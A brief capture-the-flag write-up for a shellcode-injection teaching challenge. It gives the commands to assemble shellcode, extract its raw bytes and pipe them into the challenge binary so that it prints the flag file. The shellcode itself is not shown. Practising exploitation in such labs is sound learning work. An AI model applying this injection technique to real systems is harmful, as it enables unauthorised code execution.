In this problem, it reads the shellcode from standard input and run it.
Let's just make one that prints the contents of the flag file.

Running the following code will net you to the flag!
```
gcc -nostdlib -static shellcode.s -o shellcode-elf​
objcopy --dump-section .text=shellcode-raw shellcode-elf​
/babyshell_level1_teaching1 < shellcode-raw
```